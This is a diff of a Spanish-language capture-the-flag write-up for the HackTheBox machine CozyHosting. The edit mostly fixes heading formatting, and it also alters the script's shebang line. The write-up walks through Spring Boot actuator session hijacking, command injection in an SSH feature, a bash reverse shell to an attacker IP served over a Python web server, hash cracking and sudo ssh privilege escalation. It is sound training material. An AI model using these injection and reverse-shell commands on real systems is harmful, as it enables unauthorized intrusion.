@@ -3,29 +3,29 @@
 ![](../../../../~gitbook/image.md)Publicado: 15 de Mayo de 2025
 Autor: José Miguel Romero aKa x3m1Sec
 Dificultad: ⭐ Easy
-###📝 Descripción
+### 📝 Descripción
 CozyHosting es una máquina Linux que aloja una aplicación web de un servicio de hosting. La explotación comienza con la enumeración de servicios, donde encontramos un servidor web ejecutando una aplicación Spring Boot.La máquina presenta múltiples vectores de ataque que incluyen:- Exposición de endpoints sensibles en la aplicación Spring Boot (/actuator)
 - Uso de sesiones inseguras que pueden ser manipuladas
 - Inyección de comandos en una funcionalidad de conexión SSH
 - Credenciales almacenadas en archivos de configuración
 - Escalada de privilegios mediante sudo mal configurado
 El objetivo es obtener acceso inicial como usuario app mediante la inyección de comandos, pivotear al usuario josh usando credenciales encontradas en la base de datos PostgreSQL, y finalmente escalar a root abusando de permisos sudo para el binario SSH.
-###🔭 Reconocimiento
+### 🔭 Reconocimiento
 
-####Ping para verificación en base a TTL
+#### Ping para verificación en base a TTL
 💡 Nota: El TTL cercano a 64 sugiere que probablemente sea una máquina Linux.
-####Escaneo de puertos
+#### Escaneo de puertos
 
-####Enumeración de servicios
+#### Enumeración de servicios
 ⚠️ Importante: Detectamos durante la fase de enumeración con nmap que se está realizando virtual hosting. Debemos añadir el siguiente vhost a nuestro fichero /etc/hosts
-###🌐 Enumeración Web
+### 🌐 Enumeración Web
 
-####80 HTTP
+#### 80 HTTP
 http://cozyhosting.htb![](../../../../~gitbook/image.md)Hay un panel de login que nos permite enumerar la tecnología del sitio web junto con la extensión wappalyzer:![](../../../../~gitbook/image.md)🕷️Fuzzing de vhostsNo hallamos resultados.Revisando el código fuente enumeramos el nombre de la template que se está usando y la versión de Bootstrap![](../../../../~gitbook/image.md)Aunque no encontramos vulnerabilidades ni exploits para estas versiones🕷️Fuzzing de directoriosTras probar a realizar fuzzing de directorios con las herramientas gobuster y feroxbusterObservamos un recurso /error que está devolviendo un error 500![](../../../../~gitbook/image.md)![](../../../../~gitbook/image.md)Este error es generado por una aplicación Spring Boot, cuando ocurre un error no manejado y no hay una ruta `/error` personalizada definida.Probamos a realizar fuzzint también con dirsearch y tenemos más suerte:![](../../../../~gitbook/image.md)Ahora que sabemos que la aplicación está usando springboot, existe un endpoint que utiliza spring boot para exponer los endpoints que se llama /actuator:http://cozyhosting.htb/actuator![](../../../../~gitbook/image.md)En el endponint de sessions vemos lo que parece ser o bien una cookie. De hecho por cada intento de sesión no autenticado vemos como se refleja en el endpoint:![](../../../../~gitbook/image.md)Optamos por la vía de pensar que pueda tratarse de una cookie y la seteamos:![](../../../../~gitbook/image.md)Accedemos con éxito al panel de admin como usuario kanderson:![](../../../../~gitbook/image.md)Al enumerar el servicio vemos lo que parece ser una utilidad para establecer conexión vía ssh:![](../../../../~gitbook/image.md)Interceptamos la petición con burp y vemos la respuesta:![](../../../../~gitbook/image.md)Aquí comenzamos a probar con posibles inyecciones de comandos para ver si el parámetro username es vulnerable.Encontramos este payload que nos permite confirmarlo:Con el carácter ";" permitimos escapar y ejecutar nuestro comando, usamos ${IFS} para que nos indique que el comando no puede contener espacios y finalmente cerramos con otro ";" y un hashtag # para que ignore todo lo que hay a continuación.Si iniciamos un listener en nuestro host de ataque en el puerto 80Y a continuación lanzamos la petición con la inyección de comandos, veremos que hay respuesta:![](../../../../~gitbook/image.md)SI aplicamos esta PoC creando un archivo index.html con el siguiente contenido:Lo disponibilizamos en un servidor web con python:Probamos a realizar un curl a nuestra propia máquina par verificar que hay respuesta:![](../../../../~gitbook/image.md)Iniciamos un listener en el puerto anteriormente especificadoLanzamos la petición añadiendo el pipe "|" con bash para que se ejecute el contenido con bash:Recibimos la reverse shell:![](../../../../~gitbook/image.md)
-####Foothold
+#### Foothold
 Una vez dentro, vemos que existe un usuario josh en el directorio /home pero no tenemos permisos para enumerar nada aquí.
 Enumeramos la máquina en busca de vectores que permitan la escaladaCapabilitiesPermisosGruposRevisamos el fichero de configuración de nginx por si encontrásemos alguna credencial, vhost o algún recursos de utilidad:Si revisamos el fichero /etc/passwd vemos que únicamente el usuario josh tiene login:No hallamos nada relevante.Sí encontramos un archivo .jar en el directorio /app que merece la pena analizar:Lo copiamos al directorio /tmp ya que necesitamos descomprimirlo:O también podemos transferirlo a nuestro host de ataque de la siguiente formaSi optamos por esta segunda vía, podemos verificar la integridad de la transferencia usando md5sum en el origen y en el destino para ver si coinciden.Una vez descomprimido el archivo podemos usar el comando tree para ver la estructura de archivos y ver algo interesante.Tras enumerar el contenido encontramos un fichero application.properties con credenciales de una base de datos postgres:![](../../../../~gitbook/image.md)Si revisamos los puertos /servicios que se están ejecutando localmente en la máquina vemos que efectivamente en el 5432 hay un postgres:![](../../../../~gitbook/image.md)Podemos conectarnos con las credenciales encontradas de la siguiente formaUna vez dentro enumeramos las tablas usando el comando \dt:Y a continuación consultamos el contenido de la tabla users:Procedemos a intentar crackear estos hashes usando hashcat y rockyou y tenemos éxito con el hash del usuario admin:![](../../../../~gitbook/image.md)
-####👑 Escalada de privilegios
+#### 👑 Escalada de privilegios
 No hay ningún usuario admin en el sistema, recordemos cuando hemos enumerado el directorio /home y el fichero /etc/passwd que únicamente había uno llamado josh, veamos si se está llevando a cabo la mala práctica de reutilización de contraseñas.![](../../../../~gitbook/image.md)Buscamos ahora la escalada de privilegios a root desde el usuario josh y vemos que este usuario puede ejecutar el siguiente binario como root:Buscamos información sobre este binario en gtfobins:
 https://gtfobins.github.io/gtfobins/ssh/#sudoY usamos el siguiente comando para la escalada y obtenemos la flag:Last updated 10 months ago- [📝 Descripción](#descripcion)
 - [🔭 Reconocimiento](#reconocimiento)
@@ -106,7 +106,7 @@ nc -nlvp 80
 ```
 
 ```
-#!/bin/bash
+# !/bin/bash
 
 bash -i >& /dev/tcp/10.10.14.14/4444 0>&1
 ```
@@ -118,7 +118,7 @@ python3 -m http.server 80
 ```
 ❯ curl localhost
 
-#!/bin/bash
+# !/bin/bash
 
 bash -i >& /dev/tcp/10.10.14.14/4444 0>&1
 
